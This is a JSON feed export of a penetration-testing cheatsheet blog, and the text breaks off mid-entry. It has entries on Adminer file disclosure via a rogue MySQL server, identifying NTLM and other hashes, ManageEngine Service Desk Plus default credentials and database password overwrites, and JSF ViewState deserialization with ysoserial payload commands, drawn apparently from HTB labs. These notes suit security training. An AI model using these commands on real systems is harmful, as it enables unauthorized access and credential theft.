{
    "version": "https://jsonfeed.org/version/1",
    "title": "Spindel",
    "home_page_url": "https://mvineza.github.io/spindel/",
    "feed_url": "https://mvineza.github.io/spindel/feed.json",
    "description": "A minimalist, quick search cybersecurity blog and cheatsheets",
    "icon": "https://mvineza.github.io/spindel/apple-touch-icon.png",
    "favicon": "https://mvineza.github.io/spindel/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "spindel",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/08/adminer-file-disclosure",
            "title": "Adminer File Disclosure",
            "summary": "Adminer File Disclosure",
            "content_text": "OverviewAttacker can point adminer into a rogue mysql server to get access to internal files inside the victim machine.Protocol Flaw in MySQL  The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)Steps  Update rogue_mysql_server.py with the file you want to read and run itcd ~/data/toolscat rogue_mysql_server.py | egrep 'filename ='python2 rogue_mysql_server.py  Open wireshark and filter mysql packets  Login to adminer and point it to attacker rogue mysql. The rest can be any value.  Go back to wire shark and check the mysql response from victim.References  PHP tool ‘Adminer’ leaks passwords – Sansec  Adminer 4.3.1 - Server-Side Request Forgery - PHP webapps Exploit  Alternative to the above - much easier to use",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>Attacker can point adminer into a rogue mysql server to get access to internal files inside the victim machine.</p><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/EF3B2DBA-F55A-487A-A698-BB47C683143C.png\" alt=\"\" /></p><h1 id=\"protocol-flaw-in-mysql\">Protocol Flaw in MySQL</h1><blockquote>  <p>The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)</p></blockquote><h1 id=\"steps\">Steps</h1><ul>  <li>Update <code class=\"language-plaintext highlighter-rouge\">rogue_mysql_server.py</code> with the file you want to read and run it</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cd</span> ~/data/tools<span class=\"nb\">cat </span>rogue_mysql_server.py | egrep <span class=\"s1\">'filename ='</span>python2 rogue_mysql_server.py</code></pre></div></div><ul>  <li>Open wireshark and filter mysql packets</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/EA76910F-225D-4CD4-AA58-A0B7B73F1FFC.png\" alt=\"\" /></p><ul>  <li>Login to adminer and point it to attacker rogue mysql. The rest can be any value.</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/2C2CD67E-0CD7-40AC-B898-E61DEF389D83.png\" alt=\"\" /></p><ul>  <li>Go back to wire shark and check the mysql response from victim.</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/0EE58AEE-B02F-4189-8DCF-96A72324C37B.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/0B1373DE-095F-440A-ACBF-62BC821E42DC.png\" alt=\"\" /></p><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability\">PHP tool ‘Adminer’ leaks passwords – Sansec</a></li>  <li><a href=\"https://www.exploit-db.com/exploits/43593\">Adminer 4.3.1 - Server-Side Request Forgery - PHP webapps Exploit</a></li>  <li><a href=\"https://podalirius.net/en/cves/2021-xxxxx/\">Alternative to the above</a> - much easier to use</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/08/adminer-file-disclosure",
            
            
            
            "tags": ["lfi","enum","foothold"],
            
            "date_published": "2022-04-08T00:00:00+08:00",
            "date_modified": "2022-04-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/07/hashes",
            "title": "Hashes",
            "summary": "Hashes",
            "content_text": "Determining Hash Type# using hashid# -m -- displays equivalent mode for hashcathashid -m '$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/'# hashi-identifierhash-identifier  Alternatives:          https://github.com/SmeegeSec/HashTag.git      NTLM# LM - oldest way of storing password299BD128C1101FD6# NThash - newer format of storing passwordB4B9B02E6F09A9BD760F388B67351E2B# NTLMv1# - aka Net NTLM or NTLM# - a protocol (not a hash)# - uses LM and NT hashes (see example below)# - you can use this in pass the hash attacks# - you get this from SAM (local) or NTDS (domain controller)# - aad3b435b51404eeaad3b435b51404ee (1st part, LM)# - 0e0363213e37b94221497260b0bcb4fc (2nd part, NT)Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::# NTLMv2# - similar to NTLMv1# - but harder to crack# - cannot be used for pass the hash attack since its#   time based challenge responseenterprise-security::VULNNET:8b856f99a4fased from HTB bastion, if LM hash starts with aad3b and NT hash starts with 31d6, that means both hashes are blank which most probably means Administrator account is disabled.  LM hash is normally blank out but not NT hash  Cracking LM Hash ExplanationBcrypt  Very hard to crack  You may be able to crack it via [[Hashcat]] if you use a rule file$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgWApache MD5$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/SHA1SUM  40 charactersecho test | sha1sumOther resources  Practical Usage of NTLM Hashes - ropnop blog                              [LM, NTLM, Net-NTLMv2, oh my!. A Pentester’s Guide to Windows Hashes          by Péter Gombos          Medium](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)                      example_hashes    hashcat wiki  NTLM vs. NTLMv1/v2 a.ka. Net-NTLMv1/v2 · CTF2",
            "content_html": "<h1 id=\"determining-hash-type\">Determining Hash Type</h1><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># using hashid</span><span class=\"c\"># -m -- displays equivalent mode for hashcat</span>hashid <span class=\"nt\">-m</span> <span class=\"s1\">'$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/'</span><span class=\"c\"># hashi-identifier</span>hash-identifier</code></pre></div></div><ul>  <li>Alternatives:    <ul>      <li>https://github.com/SmeegeSec/HashTag.git</li>    </ul>  </li></ul><h1 id=\"ntlm\">NTLM</h1><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># LM - oldest way of storing password</span>299BD128C1101FD6<span class=\"c\"># NThash - newer format of storing password</span>B4B9B02E6F09A9BD760F388B67351E2B<span class=\"c\"># NTLMv1</span><span class=\"c\"># - aka Net NTLM or NTLM</span><span class=\"c\"># - a protocol (not a hash)</span><span class=\"c\"># - uses LM and NT hashes (see example below)</span><span class=\"c\"># - you can use this in pass the hash attacks</span><span class=\"c\"># - you get this from SAM (local) or NTDS (domain controller)</span><span class=\"c\"># - aad3b435b51404eeaad3b435b51404ee (1st part, LM)</span><span class=\"c\"># - 0e0363213e37b94221497260b0bcb4fc (2nd part, NT)</span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::<span class=\"c\"># NTLMv2</span><span class=\"c\"># - similar to NTLMv1</span><span class=\"c\"># - but harder to crack</span><span class=\"c\"># - cannot be used for pass the hash attack since its</span><span class=\"c\">#   time based challenge response</span>enterprise-security::VULNNET:8b856f99a4fcode></pre></div></div><ul>  <li>Based from <a href=\"https://www.youtube.com/watch?v=2j3FNp5pjQ4\">HTB bastion</a>, if LM hash starts with <code class=\"language-plaintext highlighter-rouge\">aad3b</code> and NT hash starts with <code class=\"language-plaintext highlighter-rouge\">31d6</code>, that means both hashes are blank which most probably means Administrator account is disabled.</li>  <li>LM hash is normally blank out but not NT hash</li>  <li><a href=\"https://www.youtube.com/watch?v=ZfPVGJGkORQ&amp;t=2085s\">Cracking LM Hash Explanation</a></li></ul><h1 id=\"bcrypt\">Bcrypt</h1><ul>  <li>Very hard to crack</li>  <li>You may be able to crack it via [[Hashcat]] if you use a rule file</li></ul><p><img src=\"/spindel/assets/Hashes/B8838698-C3F8-4F80-9B66-55B52BEF9CB8.png\" alt=\"\" /></p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW</code></pre></div></div><h1 id=\"apache-md5\">Apache MD5</h1><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/</code></pre></div></div><h1 id=\"sha1sum\">SHA1SUM</h1><ul>  <li>40 characters</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo test</span> | <span class=\"nb\">sha1sum</span></code></pre></div></div><h1 id=\"other-resources\">Other resources</h1><ul>  <li><a href=\"https://blog.ropnop.com/practical-usage-of-ntlm-hashes/\">Practical Usage of NTLM Hashes - ropnop blog</a></li>  <li>    <table>      <tbody>        <tr>          <td>[LM, NTLM, Net-NTLMv2, oh my!. A Pentester’s Guide to Windows Hashes</td>          <td>by Péter Gombos</td>          <td>Medium](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">example_hashes    hashcat wiki</a></li>  <li><a href=\"https://d00mfist1.gitbooks.io/ctf/content/identify_hash_and_crack_it/ntlm-vs-ntlmv1v2-aka-net-ntlmv1v2.html\">NTLM vs. NTLMv1/v2 a.ka. Net-NTLMv1/v2 · CTF2</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/07/hashes",
            
            
            
            "tags": ["windows","linux","crypto"],
            
            "date_published": "2022-04-07T00:00:00+08:00",
            "date_modified": "2022-04-07T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/06/manageengine-service-desk-plus-sdp",
            "title": "ManageEngine Service Desk Plus (SDP)",
            "summary": "ManageEngine Service Desk Plus (SDP)",
            "content_text": "Credentials# defaultadministrator:administrator# guestguest:guestVersion  On login screenPort  8080/tcp  8081/tcp - NIO port?Interesting URL Paths# Mobie formhttp://examplesite.com:8080/mcRecon  Check suspicious tickets both open and closed. You might find some confidential information such as credentials.Attacks  Privilege escalation (CVE-2019-10008) - If you are having issue, try manually logging in first as guest and execute the exploit from cli.  Craeate a custom triggers that will execute command when a ticket is created (you need a valid admin account).  XXE. Looks like this also works for 9.3  Example attack path from HTB HelplineDatabase  Postgres DB runs on port 65432/tcp  No way to recover current password, but you can do hard reset I think  Here is a query to enumerate users/psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c \"select * from aaauser\"./psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c \"select aaauser.first_name, aaapassword.password from aaauser, aaapassword where aaauser.user_id = aaapassword.password_id \"  Updates user password# password: $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG# salt: $2a$12$6VGARvoc/dRcRxOckr6Wmu# NOTE:# - We use backticks here to escape `$`. If not, the command#   will fail../psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c \"update aaapassword set password='`$2a`$12`$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='`$2a`$12`$6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;\"References  HTB Helpline",
            "content_html": "<h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># default</span>administrator:administrator<span class=\"c\"># guest</span>guest:guest</code></pre></div></div><h2 id=\"version\">Version</h2><ul>  <li>On login screen</li></ul><p><img src=\"/spindel/assets/ManageEngine%20Service%20Desk%20Plus%20(SDP)/DD11A72A-B0B0-45BF-9BCD-3930BE287268.png\" alt=\"\" /></p><h2 id=\"port\">Port</h2><ul>  <li>8080/tcp</li>  <li>8081/tcp - NIO port?</li></ul><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Mobie form</span>http://examplesite.com:8080/mc</code></pre></div></div><h2 id=\"recon\">Recon</h2><ul>  <li>Check suspicious tickets both open and closed. You might find some confidential information such as credentials.</li></ul><h2 id=\"attacks\">Attacks</h2><ul>  <li><a href=\"https://packetstormsecurity.com/files/152401/Manage-Engine-ServiceDesk-Plus-9.3-Privilege-Escalation.html\">Privilege escalation (CVE-2019-10008)</a> - If you are having issue, try manually logging in first as guest and execute the exploit from cli.</li>  <li>Craeate a custom triggers that will execute command when a ticket is created (you need a valid admin account).</li></ul><p><img src=\"/spindel/assets/ManageEngine%20Service%20Desk%20Plus%20(SDP)/03EE1597-CCC0-4F70-9782-95E82A327021.png\" alt=\"\" /></p><ul>  <li><a href=\"https://labs.integrity.pt/advisories/cve-2017-9362/index.html\">XXE</a>. Looks like this also works for 9.3</li>  <li>Example attack path from <a href=\"https://0xdf.gitlab.io/2019/08/17/htb-helpline.html\">HTB Helpline</a></li></ul><p><img src=\"/spindel/assets/ManageEngine%20Service%20Desk%20Plus%20(SDP)/helpline-flow.png\" alt=\"\" /></p><h2 id=\"database\">Database</h2><ul>  <li>Postgres DB runs on port <code class=\"language-plaintext highlighter-rouge\">65432/tcp</code></li>  <li>No way to recover current password, but you can do hard reset I think</li>  <li>Here is a query to enumerate users</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">/psql.exe</span><span class=\"w\"> </span><span class=\"nt\">-h</span><span class=\"w\"> </span><span class=\"nx\">127.0.0.1</span><span class=\"w\"> </span><span class=\"nt\">-p</span><span class=\"w\"> </span><span class=\"nx\">65432</span><span class=\"w\"> </span><span class=\"nt\">-U</span><span class=\"w\"> </span><span class=\"nx\">postgres</span><span class=\"w\"> </span><span class=\"nt\">-d</span><span class=\"w\"> </span><span class=\"nx\">servicedesk</span><span class=\"w\"> </span><span class=\"nt\">-c</span><span class=\"w\"> </span><span class=\"s2\">\"select * from aaauser\"</span><span class=\"w\"></span><span class=\"o\">.</span><span class=\"n\">/psql.exe</span><span class=\"w\"> </span><span class=\"nt\">-h</span><span class=\"w\"> </span><span class=\"nx\">127.0.0.1</span><span class=\"w\"> </span><span class=\"nt\">-p</span><span class=\"w\"> </span><span class=\"nx\">65432</span><span class=\"w\"> </span><span class=\"nt\">-U</span><span class=\"w\"> </span><span class=\"nx\">postgres</span><span class=\"w\"> </span><span class=\"nt\">-d</span><span class=\"w\"> </span><span class=\"nx\">servicedesk</span><span class=\"w\"> </span><span class=\"nt\">-c</span><span class=\"w\"> </span><span class=\"s2\">\"select aaauser.first_name, aaapassword.password from aaauser, aaapassword where aaauser.user_id = aaapassword.password_id \"</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Updates user password</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># password: $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG</span><span class=\"w\"></span><span class=\"c\"># salt: $2a$12$6VGARvoc/dRcRxOckr6Wmu</span><span class=\"w\"></span><span class=\"c\"># NOTE:</span><span class=\"w\"></span><span class=\"c\"># - We use backticks here to escape `$`. If not, the command</span><span class=\"w\"></span><span class=\"c\">#   will fail.</span><span class=\"w\"></span><span class=\"o\">.</span><span class=\"n\">/psql.exe</span><span class=\"w\"> </span><span class=\"nt\">-h</span><span class=\"w\"> </span><span class=\"nx\">127.0.0.1</span><span class=\"w\"> </span><span class=\"nt\">-p</span><span class=\"w\"> </span><span class=\"nx\">65432</span><span class=\"w\"> </span><span class=\"nt\">-U</span><span class=\"w\"> </span><span class=\"nx\">postgres</span><span class=\"w\"> </span><span class=\"nt\">-w</span><span class=\"w\"> </span><span class=\"nt\">-d</span><span class=\"w\"> </span><span class=\"nx\">servicedesk</span><span class=\"w\"> </span><span class=\"nt\">-c</span><span class=\"w\"> </span><span class=\"s2\">\"update aaapassword set password='</span><span class=\"se\">`$</span><span class=\"s2\">2a</span><span class=\"se\">`$</span><span class=\"s2\">12</span><span class=\"se\">`$</span><span class=\"s2\">6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='</span><span class=\"se\">`$</span><span class=\"s2\">2a</span><span class=\"se\">`$</span><span class=\"s2\">12</span><span class=\"se\">`$</span><span class=\"s2\">6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;\"</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://0xdf.gitlab.io/2019/08/17/htb-helpline.html\">HTB Helpline</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/06/manageengine-service-desk-plus-sdp",
            
            
            
            "tags": ["windows","enum","java","postgres"],
            
            "date_published": "2022-04-06T00:00:00+08:00",
            "date_modified": "2022-04-06T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/05/java-jsf-viewstate-deserialization",
            "title": "Java JSF ViewState Deserialization",
            "summary": "Java JSF ViewState Deserialization",
            "content_text": "Viewstate  Maintains states between postbacks  Can be stored on client or server side. This is controlled by javax.faces.STATE_SAVING_METHOD settings.  There are 2 major implementatons:          Oracle Mojarra (JSF reference implementation)      Apache MyFaces        Can also be encrypted. base64-encoded keys are set by org.apache.myfaces.SECRET.  If viewstate starts with H4sIAAAA, it is base64 gzipViewstate StructureIt is a java.util.HashMap. Here is an example when generating a payload using ysoserial.`On a side note, java serialized objects starts with AC ED. Here is an example viewstate from HTB Arkham.b'\\xac\\xed\\x00\\x05ur\\x00\\x13[Ljava.lang.Object;\\x90\\xceX\\x9f\\x10s)l\\x02\\x00\\x00xp\\x00\\x00\\x00\\x03t\\x00\\x011pt\\x00\\x12/userSubscribe.jsp\\x02\\x02'Example Errors# error when providing invalid value to viewstatejavax.faces.application.ViewExpiredException: viewId:&amp;#47;userSubscribe.faces - No saved view state could be found for the view identifier: &amp;#47;userSubscribe.facesorg.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:88)org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)Injection Points# post dataj_id_jsp_1623871077_1%3Aemail=a&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState={PAYLOAD}Payload Gadgets and Affected Libraries  commons-collections-3.2.1.jar  commons-collections:3.1 - CommonsCollections7 in ysoserialPayloads# ysoserial, CommonsCollections7java -jar ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 \"ping 10.10.14.31\"java -jar ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 \"ping 10.10.14.31\" &gt; payload.datInteresting Files and Directories# config filesfaces-config.xmlweb.xmlInteresting URL Paths# JSF pages normally ends in .faces/{ANYTHING}.faces:8080/UserSubscribe.facesEncryption  Default algorithm is DES ECB mode  Viewstate can be encrypted. You can check for encyrption keys in this part of config files.&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;&lt;/context-param&gt;    &lt;context-param&gt;        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;     &lt;/context-param&gt;&lt;context-param&gt;&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;&lt;/context-param&gt;&lt;context-param&gt;  Here is an example encryption and decryption process using HmacSHA1# encryptionpayload -&gt; des_ecb_encrypt -&gt; hmac_sha1_sig -&gt; b64_encode -&gt; url_encode# decryptionvs -&gt; url_decode -&gt; b64_decode -&gt; hmac_sha1_unsig -&gt; des_ecb_decrypt  Python3 decryption# initialize&gt;&gt;&gt; vs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'# url_decode&gt;&gt;&gt; import urllib&gt;&gt;&gt; url_decoded = urllib.parse.unquote_plus(vs)&gt;&gt;&gt; url_decoded'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE='&gt;&gt;&gt; # b64_decode&gt;&gt;&gt; import base64&gt;&gt;&gt; b64_decoded = base64.b64decode(url_decoded)&gt;&gt;&gt; b64_decodedb'\\xc0z4\\xc2b\\xee\\xe5\\xc7\\x88\\xb4\\x88\\xbe#\\xb5\\xe4\\x12-F\\x01\\xbe!\\xd7e\\x99\\xf3\\xde)\\x03\\xe6x8~\\xdbr\\x8d\\xa3\\\\L\\xb5E\\x0cS\\xa8\\xb6.\\xa2I\\x8e\\xefB\\xad\\x0e\\xd9\\xe0\\x8c9\\xb4\\x98\\xdc\\xc0\\xf6\\xa1\\xe3a\\xea\\xf1\\xa3H\\xd6\\xef;\\xb5\\x99\\xd2\\x81^\\xdcgOTf\\x9de\\x16L\\x9c\\x82\\xb8\\xd7\\t\\xbb\\x11'&gt;&gt;&gt; # hmac_sha1_unsig - separate message and tag (mac)#  tag     = last 20 bytes#  message = whole signature - last 20 bytes&gt;&gt;&gt; t_bytes = b64_decoded[-20:]&gt;&gt;&gt; m_bytes = b64_decoded[:-20]&gt;&gt;&gt; t_bytesb'\\x99\\xd2\\x81^\\xdcgOTf\\x9de\\x16L\\x9c\\x82\\xb8\\xd7\\t\\xbb\\x11'&gt;&gt;&gt; m_bytesb'\\xc0z4\\xc2b\\xee\\xe5\\xc7\\x88\\xb4\\x88\\xbe#\\xb5\\xe4\\x12-F\\x01\\xbe!\\xd7e\\x99\\xf3\\xde)\\x03\\xe6x8~\\xdbr\\x8d\\xa3\\\\L\\xb5E\\x0cS\\xa8\\xb6.\\xa2I\\x8e\\xefB\\xad\\x0e\\xd9\\xe0\\x8c9\\xb4\\x98\\xdc\\xc0\\xf6\\xa1\\xe3a\\xea\\xf1\\xa3H\\xd6\\xef;\\xb5'&gt;&gt;&gt; # des_ecb_decrypt - here you see the actual java serialized# object which starts with \"\\xac\\xed\". It also includes the# URL path associated with the object which is:#   /userSubscribe.jsp&gt;&gt;&gt; from Crypto.Cipher import DES&gt;&gt;&gt; k = b'JsF9876-'&gt;&gt;&gt; crypter = DES.new(k, DES.MODE_ECB)&gt;&gt;&gt; crypter.decrypt(m_bytes)b'\\xac\\xed\\x00\\x05ur\\x00\\x13[Ljava.lang.Object;\\x90\\xceX\\x9f\\x10s)l\\x02\\x00\\x00xp\\x00\\x00\\x00\\x03t\\x00\\x011pt\\x00\\x12/userSubscribe.jsp\\x02\\x02'&gt;&gt;&gt; Tools  Online viewstate decoderReferences  Hacktricks - JSF Deserialization  JSF ViewState upside-down  Demystifying Insecure Deserialisation on JSF Application  Secure Your Application - MYFACES2 - Apache Software Foundation  HTB Arkham",
            "content_html": "<h2 id=\"viewstate\">Viewstate</h2><ul>  <li>Maintains states between postbacks</li>  <li>Can be stored on client or server side. This is controlled by <code class=\"language-plaintext highlighter-rouge\">javax.faces.STATE_SAVING_METHOD</code> settings.</li>  <li>There are 2 major implementatons:    <ul>      <li>Oracle Mojarra (JSF reference implementation)</li>      <li>Apache MyFaces</li>    </ul>  </li>  <li>Can also be encrypted. base64-encoded keys are set by <code class=\"language-plaintext highlighter-rouge\">org.apache.myfaces.SECRET</code>.</li>  <li>If viewstate starts with <code class=\"language-plaintext highlighter-rouge\">H4sIAAAA</code>, it is base64 gzip</li></ul><h2 id=\"viewstate-structure\">Viewstate Structure</h2><p>It is a <code class=\"language-plaintext highlighter-rouge\">java.util.HashMap</code>. Here is an example when generating a payload using ysoserial.</p><p>`</p><p>On a side note, java serialized objects starts with <code class=\"language-plaintext highlighter-rouge\">AC ED</code>. Here is an example viewstate from HTB Arkham.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>b'\\xac\\xed\\x00\\x05ur\\x00\\x13[Ljava.lang.Object;\\x90\\xceX\\x9f\\x10s)l\\x02\\x00\\x00xp\\x00\\x00\\x00\\x03t\\x00\\x011pt\\x00\\x12/userSubscribe.jsp\\x02\\x02'</code></pre></div></div><h2 id=\"example-errors\">Example Errors</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># error when providing invalid value to viewstate</span>javax.faces.application.ViewExpiredException: viewId:&amp;#47<span class=\"p\">;</span>userSubscribe.faces - No saved view state could be found <span class=\"k\">for </span>the view identifier: &amp;#47<span class=\"p\">;</span>userSubscribe.facesorg.apache.myfaces.lifecycle.RestoreViewExecutor.execute<span class=\"o\">(</span>RestoreViewExecutor.java:88<span class=\"o\">)</span>org.apache.myfaces.lifecycle.LifecycleImpl.executePhase<span class=\"o\">(</span>LifecycleImpl.java:103<span class=\"o\">)</span>org.apache.myfaces.lifecycle.LifecycleImpl.execute<span class=\"o\">(</span>LifecycleImpl.java:76<span class=\"o\">)</span>javax.faces.webapp.FacesServlet.service<span class=\"o\">(</span>FacesServlet.java:244<span class=\"o\">)</span>org.apache.tomcat.websocket.server.WsFilter.doFilter<span class=\"o\">(</span>WsFilter.java:52<span class=\"o\">)</span></code></pre></div></div><h2 id=\"injection-points\">Injection Points</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># post data</span>j_id_jsp_1623871077_1%3Aemail<span class=\"o\">=</span>a&amp;j_id_jsp_1623871077_1%3Asubmit<span class=\"o\">=</span>SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT<span class=\"o\">=</span>1&amp;javax.faces.ViewState<span class=\"o\">={</span>PAYLOAD<span class=\"o\">}</span></code></pre></div></div><h2 id=\"payload-gadgets-and-affected-libraries\">Payload Gadgets and Affected Libraries</h2><ul>  <li>commons-collections-3.2.1.jar</li>  <li>commons-collections:3.1 - CommonsCollections7 in ysoserial</li></ul><h2 id=\"payloads\">Payloads</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># ysoserial, CommonsCollections7</span>java <span class=\"nt\">-jar</span> ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 <span class=\"s2\">\"ping 10.10.14.31\"</span>java <span class=\"nt\">-jar</span> ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 <span class=\"s2\">\"ping 10.10.14.31\"</span> <span class=\"o\">&gt;</span> payload.dat</code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># config files</span>faces-config.xmlweb.xml</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># JSF pages normally ends in .faces</span>/<span class=\"o\">{</span>ANYTHING<span class=\"o\">}</span>.faces:8080/UserSubscribe.faces</code></pre></div></div><h2 id=\"encryption\">Encryption</h2><ul>  <li>Default algorithm is <code class=\"language-plaintext highlighter-rouge\">DES ECB mode</code></li>  <li>Viewstate can be encrypted. You can check for encyrption keys in this part of config files.</li></ul><div class=\"language-xml highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;param-name&gt;</span>org.apache.myfaces.SECRET<span class=\"nt\">&lt;/param-name&gt;</span><span class=\"nt\">&lt;param-value&gt;</span>SnNGOTg3Ni0=<span class=\"nt\">&lt;/param-value&gt;</span><span class=\"nt\">&lt;/context-param&gt;</span>    <span class=\"nt\">&lt;context-param&gt;</span>        <span class=\"nt\">&lt;param-name&gt;</span>org.apache.myfaces.MAC_ALGORITHM<span class=\"nt\">&lt;/param-name&gt;</span>        <span class=\"nt\">&lt;param-value&gt;</span>HmacSHA1<span class=\"nt\">&lt;/param-value&gt;</span>     <span class=\"nt\">&lt;/context-param&gt;</span><span class=\"nt\">&lt;context-param&gt;</span><span class=\"nt\">&lt;param-name&gt;</span>org.apache.myfaces.MAC_SECRET<span 